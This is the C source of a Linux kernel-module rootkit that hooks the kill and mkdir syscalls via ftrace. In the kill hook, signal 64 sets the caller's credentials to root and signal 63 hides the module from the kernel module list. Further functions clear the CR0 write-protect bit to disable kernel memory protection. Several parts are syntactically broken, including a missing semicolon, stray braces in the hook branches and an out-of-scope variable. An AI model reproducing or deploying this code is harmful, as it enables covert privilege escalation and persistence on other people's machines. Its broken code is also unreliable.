#include <linux/init.h>             //must have to make a kernal module
#include <linux/module.h>           //must have to make a kernal module
#include <linux/kernel.h>           //to ger kernal methods
#include <linux/syscalls.h>         // to get syscalltable
#include <linux/kallsyms.h>         //also to get acces to kallsysm_lookup_name
#include <linux/kprobes.h>          //work around for kernal 5.6.0 and above
#include <linux/unistd.h>           // contains syscall numbers
#include <linux/version.h>          // linux kernel versions 
#include <linux/dirent.h>	        //contains dirent structs etc

#include "ftrace_helper.h"          //helps with setting the hooked functions bach to default

MODULE_LICENSE("GPL");
MODULE_AUTHOR("infernexio");
MODULE_DESCRIPTION("rootkit");
MODULE_VERSION("0.0.1");


enum signals{
    SIGSUPER = 64, //become root
    SIGINVIS = 63, // hide
};

unsigned long *__sys_call_table = NULL;
static int hidden = 0;
static struct list_head *prev_module;

#ifdef CONFIG_X86_64
/* on 64-bit x86 and kernel v4.17 syscalls are nolonger
 allowed to be called form the kernel*/
#if LINUX_VERSION_CODE >= KERNEL_VERSION(4,17,0)
#define PTREGS_SYSCALL_STUB 1
/* kill */
typedef asmlinkage long (*ptregs_t)(const struct pt_regs *regs);
static ptregs_t orig_kill;
/* mkdir */
typedef asmlinkage long (*ptregs_t)(const struct pt_regs *);
static ptregs_t orig_mkdir;
#else
/* kill */
typedef asmlinkage long (*orig_kill_t)(pid_t pid, int sig);
static orig_kill_t orig_kill;
/* mkdir */
typedef asmlinkage long(*orig_mkdir_t)(const char __user *pathname, umode_t mode);
static orig_mkdir_t orig_mkdir;
#endif
#endif


#if PTREGS_SYSCALL_STUB
static asmlinkage long hook_kill(const struct pt_regs *regs){
    int sig = regs->si;
    void set_root(void);
    void hide_me(void);
    void show_me(void)

    if(sig == SIGSUPER){
        printk(KERN_INFO "signal: %d == SIGSUPER %d | giving root privilges", sig, SIGSUPER);
        set_root();
        return 0;
    }else if(sig == SIGINVIS && (hidden) == 0){}
        printk(KERN_INFO "signal: %d == SIGINVIS %d | hiding the rootkit", sig, SIGINVIS);
        hide_me();
        hidden = 1;
        return 0;
    }else if(sig == SIGINVIS && (hidden) == 1){
        /* This is only for testing we don't want anyone to get rid of our rootkit */
        printk(KERN_INFO "signal: %d == SIGINVIS %d | reavling the rootkit", sig, SIGINVIS);
        show_me();
        hidden = 0;
        return 0;
    }

    printk(KERN_INFO "***** hacked kill syscall *****\n");

    return orig_kill(regs);
}

static asmlinkage int hook_mkdir(const struct pt_regs *regs){
    char __user *pathname = (char *)regs->di;
    char dir_name[NAME_MAX] = {0};

    long error = strncpy_from_user(dir_name, pathname, NAME_MAX);

    if(error > 0){
        printk(KERN_INFO "rootkit: trying to create directory with name : %s\n", dir_name);
    }
    printk(KERN_INFO "***** hacked mkdir syscall *****\n");

    orig_mkdir(regs);
    return 0;
}

#else
static asmlinkage long hook_kill(pid_t pid, int sig){
	void set_root(void);
    void hide_me(void);
    void show_me(void);
    
    if(sig == SIGSUPER){
        printk(KERN_INFO "signal: %d == SIGSUPER %d | giving root priveliges", sig, SIGSUPER);
        set_root();
        return 0;
    }else if(sig == SIGINVIS && (hidden) == 0){}
        printk(KERN_INFO "signal: %d == SIGINVIS %d | hiding the rootkit", sig, SIGINVIS);
        hide_me();
        hidden = 1;
        return 0;
    }else if(sig == SIGINVIS && (hidden) == 1){
        /* This is only for testing we don't want anyone to get rid of our rootkit */
        printk(KERN_INFO "signal: %d == SIGINVIS %d | reavling the rootkit", sig, SIGINVIS);
        show_me();
        hidden = 0;
        return 0;
    }
    
    printk(KERN_INFO "***** hacked kill syscall *****\n");

    return orig_kill(regs);
}

static asmlinkage int hook_mkdir(const char __user *pathname, umode_t mode){

    char dir_name[NAME_MAX] = {0};

    long error =  strncpy_from_user(dir_name, pathname, NAME_MAX);

    if(error > 0){
        printk(KERN_INFO "rootkit: trying to create directory with name : %s\n", dir_name);
    }
    printk(KERN_INFO "***** hacked mkdir syscall *****\n");

    orig_mkdir(pathname, mode);
    return 0;
}
#endif

void hide_me(void){
    prev_module = THIS_MODULE->list.prev;
    list_del(&THIS_MODULE->list);
}

void show_me(void){
    list_add(&THIS_MODULE->list, prev_module);
}

/**
 * changes the credentials of the given user to be root
*/
void set_root(void){
    struct cred *root;
    root = prepare_creds();

    if( root == NULL){
        return;
    }

    root->uid.val = root->gid.val = 0;
    root->euid.val = root-> egid.val =0;
    root->suid.val = root->sgid.val = 0;
    root->fsuid.val = root->fsgid.val = 0;

    commit_creds(root);
}

/**
 * Custom write_cr0 function to unprotect memory
 * this gets past the checks that the write_cr0 has
 */
static inline void write_cr0_forced(unsigned long val){
    unsigned long __force_order;

    asm volatile(
        "mov %0, %%cr0"
        : "+r"(val), "+m"(__force_order));
}

/**
 * Disables write protection
*/
static void unprotect_memory(void){
    write_cr0_forced(read_cr0() & (~ 0x10000));
    printk(KERN_INFO "unportected memory\n");
}


/**
 * enables memory protection
*/
static void protect_memory(void){
    write_cr0_forced(read_cr0() | (0x10000));
    printk(KERN_INFO "protected memory\n");
}

/**
 * checks kernel version and gets address of syscall table
 * @return - returns the memory adress of the syscall table
*/
static unsigned long *get_syscall_table(void){
    unsigned long *syscall_table;

#if LINUX_VERSION_CODE < KERNEL_VERSION(6,0,0)
        syscall_table = (unsigned long*)kallsyms_lookup_name("sys_call_table");
    #else
        syscall_table = NULL;
    #endif

	//printk(KERN_INFO "syscaltable value: %ln",syscall_table);
        return syscall_table;
}

/**
 * array of functins hooked by this rootkit
*/
static struct ftrace_hook hooks[] = {
    HOOK("sys_kill", hook_kill, &orig_kill),
    HOOK("sys_mkdir", hook_mkdir, &orig_mkdir),
};

/**
 * start of the rootkit
 * like the main method
*/
static int __init init_func(void){
    int err = 1;
    printk(KERN_INFO "rootkit: initalized\n");

    err = fh_install_hooks(hooks, ARRAY_SIZE(hooks));


    __sys_call_table = get_syscall_table();

    if(!__sys_call_table){
        printk(KERN_INFO "error: unable to gain syscal table\n");
        return err;
    }

    // if(store() == err){
    //     printk(KERN_INFO "error:store error\n");
    // }

    unprotect_memory();

    // if(hook() == err){
    //     printk(KERN_INFO "error: hook error\n");
    // }

    protect_memory();

    return 0;
}

/**
 * exit of the rootkit
*/
static void __exit exit_func(void){
    int err = 1;
    printk(KERN_INFO "rootkit: stoped\n");

    unprotect_memory();

    fh_remove_hooks(hooks, ARRAY_SIZE(hooks));

    // if(cleanup() == err){
    //     printk(KERN_INFO "error: clean up error\n");
    // }

    protect_memory();
}

/**
 * sets the init and exit methods
*/
module_init(init_func);
module_exit(exit_func);


//Older way to do the cleanup and hooking the ftrace functions are much easier
/**
 * for clearn up after the syscall
*/
// static int cleanup(void){
//     /* kill */
//     __sys_call_table[__NR_kill] = (unsigned long)orig_kill;

//     return 0;
// }

/**
 * stores the id of the sys call to later hook
*/
// static int store(void){
// /* if LINUX_VERSION_CODE >= KERNEL_VERSION(4,17,0) syscall use pt_regs stub*/
// #if PTREGS_SYSCALL_STUB
//     /* kill */
//     orig_kill = (ptregs_t)__sys_call_table[__NR_kill];
//     printk(KERN_INFO "orig_kill table entry successfully sotred\n");

// /* if LINUX_VERSION_CODE < KERNEL_VERSION(4,17,0) */
// #else
//     /* kill */
//     orig_kill = (orig_kill_t)__sys_call_table[__NR_kill];
//     printk(KERN_INFO "orig_kill table entry successfully sotred\n");
// #endif

//     return 0;
    
// }

// static int hook(void){
//     /* kill */
//     __sys_call_table[__NR_kill] = (unsigned long)&hacked_kill;
//     return 0;
// }
